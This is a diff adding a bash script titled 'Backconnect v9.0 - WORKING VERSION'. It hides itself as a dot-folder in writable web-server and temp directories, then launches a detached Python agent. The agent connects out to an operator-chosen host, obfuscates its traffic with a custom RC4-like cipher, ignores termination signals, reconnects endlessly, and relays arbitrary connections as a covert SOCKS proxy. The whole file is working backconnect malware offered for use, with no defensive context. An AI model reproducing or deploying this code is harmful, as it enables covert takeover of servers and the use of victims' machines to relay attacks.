@@ -1,0 +1,199 @@
+#!/bin/bash
+# Backconnect v9.0 - WORKING VERSION
+N="bcksocks";D=15;PD=""
+
+find_writable() {
+    for d in /tmp /var/tmp /dev/shm /run \
+        /var/www/html /var/www /srv/www /srv/http \
+        /home/*/public_html /home/*/www /home/*/web \
+        /usr/share/nginx/html /usr/share/apache2/htdocs \
+        /var/www/*/public /var/www/*/html \
+        /opt/lampp/htdocs /opt/bitnami/apache/htdocs \
+        "$HOME/public_html" "$HOME/www" "$HOME"; do
+        [ -d "$d" ] && [ -w "$d" ] && { echo "$d/.$N"; return; }
+    done
+    echo "./.$N"
+}
+
+PD="$(find_writable)"
+
+ka(){ pkill -9 -f "$N" 2>/dev/null;rm -rf "$PD";echo "Done";exit 0; }
+st(){ echo "Status:";[ -d "$PD" ]||{ echo " None";exit 0; }
+    for f in "$PD"/*.pid;do [ -f "$f" ]||continue;p=$(cat "$f");n=$(basename "$f" .pid)
+    kill -0 "$p" 2>/dev/null&&echo " + $n ($p)"||echo " - $n";done;exit 0; }
+
+spawn() {
+    local host="$1" port="$2" id="$3"
+    mkdir -p "$PD" 2>/dev/null
+    local pidf="$PD/${id}.pid"
+    local pyf="$PD/${id}.py"
+    
+    cat > "$pyf" << PYEND
+import socket,select,threading,random,time,os,sys,signal,errno
+H='$host'
+P=$port
+x=bytearray(50)
+for i in range(50):x[i]=int(random.random()*255)
+
+def R(p,l,b,s,z):
+    r=list(range(256));p0=p1=p2=p3=p4=p5=p6=p7=p8=0;c=z;i=0;j=0;g=0
+    while c>0:b[s+i]^=p[j];i+=1;j+=1;c-=1;j=0 if j==l else j
+    while 1:
+        if g==0:p2=0;p3=l
+        if g!=0:
+            g=0;p2+=1;p3-=1
+            if p3==0:continue
+        p7=r[p0];t=p[p2];p1+=t;p1&=255;p1+=p7;p1&=255;p6=r[p1];r[p0]=p6;r[p1]=p7;p0+=1;p0&=255
+        if p0!=0:g=1;continue
+        p4=z;p1=p0=p2=p3=0
+        while 1:
+            p2+=1;p2&=255;p7=r[p2];p1+=p7;p1&=255;p8=r[p1];r[p2]=p8;r[p1]=p7;p8+=p7;p8&=255;p0=r[p8]
+            p5=b[s+p3];p5^=p0;b[s+p3]=p5;p3+=1;p4-=1
+            if p4==0:break
+        break
+    i=0;c=z;j=0
+    while c>0:b[s+i]^=p[j];i+=1;j+=1;c-=1;j=0 if j==l else j
+
+L=threading.Lock()
+def T(k,d):
+    with L:
+        try:k.sendall(d);return 1
+        except:return 0
+
+sa=[0]*200;sk=[None]*200;sL=threading.Lock()
+
+def C(n,sS,cS,b0):
+    def w():
+        r=bytearray([n,0x0A,0,5,1,0,1,0,0,0,0,0,0]);d='';pt=0;o=0
+        try:
+            cS.setsockopt(6,1,1);cS.setblocking(0)
+            if b0[7]==3:
+                dl=b0[8];d=b0[9:9+dl].decode('latin-1');pt=(b0[9+dl]<<8)|b0[9+dl+1]
+            elif b0[7]==1:
+                d="{}.{}.{}.{}".format(b0[8],b0[9],b0[10],b0[11]);pt=(b0[12]<<8)|b0[13]
+            else:raise Exception()
+            try:cS.connect((d,pt))
+            except BlockingIOError:pass
+            except socket.error as e:
+                if e.errno!=errno.EINPROGRESS:raise
+            _,wl,_=select.select([],[cS],[],10)
+            if wl:
+                e=cS.getsockopt(socket.SOL_SOCKET,socket.SO_ERROR)
+                if e==0:
+                    cS.setblocking(0)
+                    with sL:sa[n]=1;sk[n]=cS
+                    r[4]=0;o=1
+                else:raise Exception()
+            else:raise Exception()
+        except:
+            try:cS.close()
+            except:pass
+        R(x,50,r,0,3);R(x,50,r,3,10);T(sS,bytes(r));R(x,50,r,0,3)
+        if o:
+            while sa[n]==1:
+                try:
+                    cs=sk[n]
+                    if not cs:break
+                    rl,_,_=select.select([cs],[],[],1)
+                    if not rl:continue
+                    dt=cs.recv(65530)
+                    if not dt:break
+                    b=bytearray([n,len(dt)&255,(len(dt)>>8)&255])+bytearray(dt)
+                    R(x,50,b,0,3);R(x,50,b,3,len(dt))
+                    if not T(sS,bytes(b)):break
+                except:break
+        with sL:sa[n]=0
+        cs=sk[n]
+        if cs:
+            try:cs.close()
+            except:pass
+        r[1]=0;r[2]=0;R(x,50,r,0,3);T(sS,bytes(r[:3]))
+    threading.Thread(target=w,daemon=1).start()
+
+def B():
+    rm=r4=ebx=edx=0;b0=bytearray();bn=bytearray(3);ex=0
+    try:
+        sk[0]=socket.socket(2,1);sk[0].setsockopt(6,1,1);sk[0].connect((H,P))
+        b=bytearray(100);b[:50]=x;b[50]=255;b[51]=255;b[54:60]=b"Python"
+        R(x,50,b,50,50);sk[0].sendall(bytes(b))
+        while 1:
+            if r4!=4:
+                rl,_,_=select.select([sk[0]],[],[],60)
+                if not rl:
+                    if bn!=bytearray(3)or rm or r4:break
+                    R(x,50,bn,0,3);T(sk[0],bytes(bn));bn=bytearray(3);continue
+            if rm or r4==4:
+                if edx==0:
+                    if len(b0)>=2 and b0[0]==255 and b0[1]==254:ex=1;break
+                    elif 0<ebx<200:
+                        with sL:sa[ebx]=0
+                else:
+                    d=sk[0].recv(edx-rm)
+                    if not d:break
+                    rm+=len(d);b0.extend(d)
+                    if edx==rm:
+                        R(x,50,b0,4,rm)
+                        if b0[0]==0:
+                            cs=socket.socket(2,1)
+                            C(ebx,sk[0],cs,b0)
+                        else:
+                            cs=sk[ebx]
+                            if cs:
+                                try:cs.sendall(bytes(b0[4:4+rm]))
+                                except:
+                                    with sL:sa[ebx]=0
+                        rm=0
+                r4=0;b0=bytearray()
+            else:
+                if r4==0:b0=bytearray()
+                d=sk[0].recv(4-r4)
+                if not d:break
+                r4+=len(d);b0.extend(d);bn=bytearray(3)
+                if r4==4:R(x,50,b0,0,4);ebx=b0[1];edx=b0[2]|(b0[3]<<8)
+    except:pass
+    try:sk[0].close()
+    except:pass
+    for i in range(200):sa[i]=0
+    time.sleep(10)
+    if ex:sys.exit(0)
+
+try:open('$pidf','w').write(str(os.getpid()))
+except:pass
+for s in[1,15,2,13]:
+    try:signal.signal(s,signal.SIG_IGN)
+    except:pass
+while 1:
+    try:B()
+    except:time.sleep(10)
+PYEND
+
+    chmod +x "$pyf"
+    setsid python3 "$pyf" </dev/null >/dev/null 2>&1 &
+    sleep 1
+    [ -f "$pidf" ] && pid=$(cat "$pidf") && kill -0 "$pid" 2>/dev/null && return 0
+    return 1
+}
+
+SRV=();PT=""
+case "${1:-}" in
+-h|--help)echo "Usage: $0 HOST:PORT [...] | -p PORT IP [...] | -f file | -k | -s";exit 0;;
+-k)ka;;-s)st;;
+-p)PT="$2";shift 2;for i in "$@";do SRV+=("$i:$PT");done;;
+-f)[ -f "$2" ]||{ echo "No file";exit 1; }
+   while IFS= read -r l||[ -n "$l" ];do l="${l//[[:space:]]/}";[[ -z "$l"||"$l"==\#* ]]||SRV+=("$l");done<"$2";;
+*)for a in "$@";do [[ "$a"==*:* ]]&&SRV+=("$a")||SRV+=("$a:443");done;;
+esac
+
+[ ${#SRV[@]} -eq 0 ]&&{ echo "Usage: $0 -h";exit 1; }
+command -v python3 &>/dev/null||{ echo "python3?";exit 1; }
+
+mkdir -p "$PD";c=0
+for s in "${SRV[@]}";do
+    h="${s%:*}";p="${s#*:}";id="${h}_${p}"
+    c=$((c+1))
+    [ -f "$PD/${id}.pid" ]&&oldpid=$(cat "$PD/${id}.pid")&&kill -0 "$oldpid" 2>/dev/null&&{ echo "[$c/${#SRV[@]}] $h:$p running";[ "$c" -lt "${#SRV[@]}" ]&&sleep "$D";continue; }
+    printf "[$c/${#SRV[@]}] $h:$p "
+    spawn "$h" "$p" "$id" && echo "OK" || echo "FAIL"
+    [ "$c" -lt "${#SRV[@]}" ]&&sleep "$D"
+done
+echo "Done"
